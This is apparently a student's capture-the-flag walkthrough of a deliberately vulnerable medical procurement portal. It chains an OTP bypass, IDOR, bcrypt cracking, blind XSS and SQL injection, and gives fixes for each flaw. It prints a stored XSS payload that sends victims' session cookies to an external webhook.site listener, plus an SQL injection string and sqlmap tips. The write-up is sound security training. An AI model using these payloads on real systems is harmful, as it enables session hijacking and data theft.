# Day 16 — CTF Challenge Revision & Takeaways

**MedSupply Pentest Walkthrough, Vulnerability Chain Analysis & Key Learnings**

**Date:** Sunday May 10, 2026

---

## Overview

Today's session was a hands-on CTF challenge on a deliberately vulnerable web application called **MedSupply** — a medical procurement portal running on `35.170.201.155`. The objective was to find 5 flags in the format `FLAG{...}` using real-world attack techniques covered throughout the program.

**Final score: 4 / 5 flags found**

| # | Flag | Technique |
|---|------|-----------|
| 1 | `FLAG{Fu33ing_Wins}` | OTP bypass + hidden internal API |
| 2 | `FLAG{Broken_Access_Control}` | IDOR via public feed UUID leak |
| 3 | `FLAG{Horizontal_priv_Esc}` | bcrypt hash cracking + login as another hospital |
| 4 | `FLAG{Blind_XSS_Account_TakeOver}` | Stored XSS → support cookie exfiltration |
| 5 | *(SQL Injection → MySQL dump — in progress)* | SQLi in /support/search |

**Writeup PDF:** submitted to GitHub at `Submissions/sofonyas/MedSupply-CTF-Writeup-Final.pdf`

---

## The Attack Chain — How the Flags Connected

The challenge was designed so that each flag fed into the next. This is called **vulnerability chaining** — a core real-world pentest skill.

```
Recon (nmap)
    ↓
Register + Login
    ↓
OTP Bypass (response manipulation)     → FLAG 1
    ↓
Authenticated session → Recursive ffuf
    ↓
/internal/api/account/details discovered
    ↓
/api/public-orders leaks UUIDs
    ↓
IDOR — substitute other hospitals' UUIDs  → FLAG 2
    ↓
Leaked bcrypt hashes → John the Ripper cracking
    ↓
Login as Addis General Hospital            → FLAG 3
    ↓
Stored XSS in /support/submit
    ↓
Support bot views ticket → cookie exfiltrated
    ↓
Session hijack → /support/dashboard        → FLAG 4
    ↓
/support/search SQLi → MySQL dump          → FLAG 5 (attempted)
```

---

## Flag 1 — OTP Bypass via Response Manipulation

**Vulnerability:** Missing server-side session state validation.

**What happened:**
The login flow issued a session cookie before OTP was verified. The cookie was already valid — the server just redirected the browser to `/verify-otp` as a UI gate. When we intercepted the OTP verification response in Burp and changed `200 OK` to `302 Found` with `Location: /dashboard`, the browser followed the redirect and the server accepted it.

**Why it worked:**
The server never re-checked whether the session had completed OTP verification when loading `/dashboard` or any other protected route. The pre-auth cookie was sufficient.

**Key learning:** 2FA/MFA bypass via response manipulation is a real and common finding. The server must enforce OTP completion server-side, not just redirect the browser. Always test: what happens if you skip the OTP page entirely and go straight to `/dashboard`?

**CWE:** CWE-287 — Improper Authentication  
**OWASP:** A07:2021 — Identification and Authentication Failures

---

## Flag 2 — IDOR (Broken Object Level Authorization)

**Vulnerability:** No ownership check on the internal API.

**What happened:**
The `/api/public-orders` endpoint — meant to show a public feed of medication orders — leaked the internal UUID (`requesting_hospital_id`) of every hospital that placed an order. Those same UUIDs were used as the access control key in `/internal/api/account/details?user_id=`. The endpoint checked whether you were logged in but not whether the UUID you requested belonged to you.

**Why it worked:**
UUID ≠ security. Even though UUIDs look unguessable, they were publicly exposed by another endpoint. The access control assumption was "no one will know other users' IDs" — security through obscurity, which always fails.

**Key learning:** Always check: does every API endpoint verify not just *who* you are but *whether you own* the resource you're requesting? Test by creating two accounts and accessing account A's resources while authenticated as account B.

**CWE:** CWE-639 — Authorization Bypass Through User-Controlled Key  
**OWASP:** A01:2021 — Broken Access Control / OWASP API Top 10 — API1 BOLA

---

## Flag 3 — Hash Cracking & Horizontal Privilege Escalation

**Vulnerability:** Sensitive data exposure + weak password.

**What happened:**
The IDOR response leaked bcrypt password hashes for every hospital. The Addis General Hospital hash (`$2b$08$...`) was cracked offline using John the Ripper with the rockyou.txt wordlist in under 90 seconds. The password was `30secondstomars` (a band name). Logging in as that account revealed a flag and a hint pointing toward vertical escalation.

**Why it worked:**
Two failures combined:
1. The API should never return password hashes — not even hashed ones
2. The password was a dictionary word (common band name) — weak against wordlist attacks

**Horizontal vs Vertical privilege escalation:**
- **Horizontal:** Accessing another user's data at the *same* privilege level (hospital → hospital) — what we did here
- **Vertical:** Escalating to a *higher* privilege level (hospital → admin) — what the hint pointed toward

**Key learning:** bcrypt is strong but not magic — weak passwords crack fast. And APIs must never expose hashes regardless of algorithm. The fix is: don't include `password_hash` in API responses.

**CWE:** CWE-916 — Use of Password Hash With Insufficient Computational Effort (weak password)  
**CWE:** CWE-200 — Exposure of Sensitive Information  
**OWASP:** A02:2021 — Cryptographic Failures

---

## Flag 4 — Blind XSS & Session Hijacking

**Vulnerability:** Stored XSS in an admin-viewed interface, no HttpOnly on session cookie.

**What happened:**
The support ticket form at `/support/submit` stored user input without sanitization. A support-role bot automatically reviewed submitted tickets. We submitted a payload that, when rendered by the bot's browser, sent their `connect.sid` cookie to an external listener (webhook.site). We then used that stolen cookie to access `/support/dashboard` — a page restricted to the support role.

**Why it's "blind" XSS:**
We couldn't see the XSS fire ourselves. We injected it and waited for an external callback to confirm execution — hence "blind." This is common in admin panels, ticket systems, and log viewers.

**The payload:**
```html
<img src=x onerror="fetch('https://webhook.site/YOUR-ID?c='+document.cookie)">
```

**Why the cookie was stealable:**
The `connect.sid` cookie was **not** marked `HttpOnly`. If it had been, `document.cookie` would not have returned it and the session hijack would have failed.

**Key learning:** HttpOnly + Secure on all session cookies is mandatory. Output encoding on every user-controlled value rendered in HTML. CSP headers to restrict script execution sources.

**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation (XSS)  
**OWASP:** A03:2021 — Injection / A07:2021 — Identification and Authentication Failures

---

## Flag 5 — SQL Injection (In Progress)

**Vulnerability:** SQL injection in `/support/search` endpoint (accessible after stealing support cookie).

**What was found:**
After gaining the support session via XSS, the `/support/search?query=` parameter was found to be injectable. Manual testing confirmed a UNION-based injection dumping the full user table — revealing hospital, support, and **admin** accounts.

**Injection payload used:**
```
/support/search?query=' OR '1'='1
```

**What was being attempted:**
Using sqlmap with the support session to enumerate all tables and dump the database — specifically looking for a `flags` table or admin credentials.

**sqlmap issue encountered:**
The session cookie contained `+` and `:` characters that were being mangled. Fix: URL-encode the cookie (`+` → `%2B`, `:` → `%3A`) and use `-H` instead of `--cookie`.

**Key learning:** SQL injection is still #1. Always test search boxes, filter inputs, and any parameter that queries a database — including those behind authentication. Second, always test URL-encoded variants of your payloads.

**CWE:** CWE-89 — Improper Neutralization of Special Elements used in an SQL Command  
**OWASP:** A03:2021 — Injection

---

## Key Methodological Takeaways

### 1. Recon is everything
The nmap scan revealed port 8080 — which turned out to be the internal mail service exposing OTPs. Without recon, that would have been missed.

### 2. Recursive fuzzing is non-negotiable
The flag endpoint was 4 levels deep: `/internal/api/account/details`. ffuf's `-recursion` flag was the only reason we found it. A single-level fuzz would have stopped at `/internal` (302) and never gone deeper.

### 3. Read JS source files
The `/api/public-orders` endpoint was never in any wordlist — it was found by reading the inline JavaScript in the `/public-feed` page source. Source code review during a pentest is as important as fuzzing.

### 4. Chain vulnerabilities
No single vulnerability gave full access. The chain was: OTP bypass → session → fuzzing → IDOR → hash leak → crack → login → XSS → session hijack → SQLi. Real-world pentests work the same way.

### 5. Document every step
Screenshots of every Burp request, every curl output, every flag in the browser. The writeup is as important as the finding — if you can't document it, it didn't happen professionally.

---

## Tools Used Today

| Tool | What we used it for |
|------|-------------------|
| **nmap** | Initial port scan — found ports 22, 80, 8080 |
| **Burp Suite** | OTP response manipulation, traffic analysis |
| **ffuf** | Recursive directory fuzzing to find /internal chain |
| **curl** | Manual API testing, IDOR loop, cookie testing |
| **John the Ripper** | Cracking bcrypt hash with rockyou.txt |
| **webhook.site** | Blind XSS callback — received exfiltrated cookie |
| **sqlmap** | Automated SQL injection exploitation |
| **Firefox DevTools** | Reading cookies, viewing page source and JS |

---

## What to Finish

- [ ] Flag 5 — Fix sqlmap cookie encoding and dump the database
- [ ] Add final flag screenshot to writeup PDF
- [ ] PortSwigger labs assigned in Day 15 — SQL injection + XSS tracks
